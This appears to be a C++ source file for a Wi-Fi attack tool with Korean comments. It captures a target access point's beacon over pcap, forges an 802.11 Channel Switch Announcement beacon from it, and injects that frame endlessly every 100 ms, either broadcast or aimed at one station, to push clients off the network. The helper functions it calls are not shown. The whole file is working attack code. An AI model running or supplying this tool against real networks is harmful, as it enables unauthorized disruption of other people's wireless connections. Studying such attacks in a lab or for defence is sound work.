#include <cstdio>
#include <cstring>
#include <unistd.h>
#include <pcap.h>
#include "param.h"
#include "dot11.h"
#include "radiotap.h"

int getRadiotapLen(const uint8_t* pkt) {
    uint16_t len;
    memcpy(&len, pkt + 2, sizeof(len));
    return (int)len;
}

void attackLoop(pcap_t* handle) {
    // 첫 패킷으로 radiotap 길이 확인
    struct pcap_pkthdr* header;
    const uint8_t* pkt;
    while (pcap_next_ex(handle, &header, &pkt) == 0);
    int rtLen = getRadiotapLen(pkt);

    // radiotap에서 FCS 여부 판별
    RadioTapHdr rtHdr;
    memcpy(&rtHdr, pkt, sizeof(rtHdr));
    bool fcs = rtHdr.has_fcs();

    // beacon 캡처
    uint8_t beaconBuf[4096];
    int beaconLen = 0;
    if (!captureBeacon(handle, args_.apMac, rtLen, beaconBuf, &beaconLen)) {
        fprintf(stderr, "[-] Failed to capture beacon\n");
        return;
    }

    // CSA 패킷 빌드
    uint8_t csaBuf[4096];
    int csaLen = buildCsaPacket(beaconBuf, beaconLen, rtLen, fcs,
                                csaBuf, sizeof(csaBuf));
    if (csaLen <= 0) {
        fprintf(stderr, "[-] Failed to build CSA packet\n");
        return;
    }

    Mac bcast("ff:ff:ff:ff:ff:ff");

    int count = 0;
    while (true) {
        if (!args_.hasStation)
            setAddr1(csaBuf, rtLen, bcast);
        else
            setAddr1(csaBuf, rtLen, args_.staMac);

        if (pcap_sendpacket(handle, csaBuf, csaLen) != 0)
            fprintf(stderr, "sendpacket error: %s\n", pcap_geterr(handle));

        count++;
        printf("\r[*] Sent %d CSA beacon(s)...", count);
        fflush(stdout);
        usleep(100000);
    }
}

int main(int argc, char* argv[]) {
    if (!parseArgs(argc, argv)) {
        usage(argv[0]);
        return 1;
    }

    pcap_t* handle = openHandle(args_.iface);
    if (!handle) return 1;

    printInfo();
    attackLoop(handle);

    pcap_close(handle);
    return 0;
}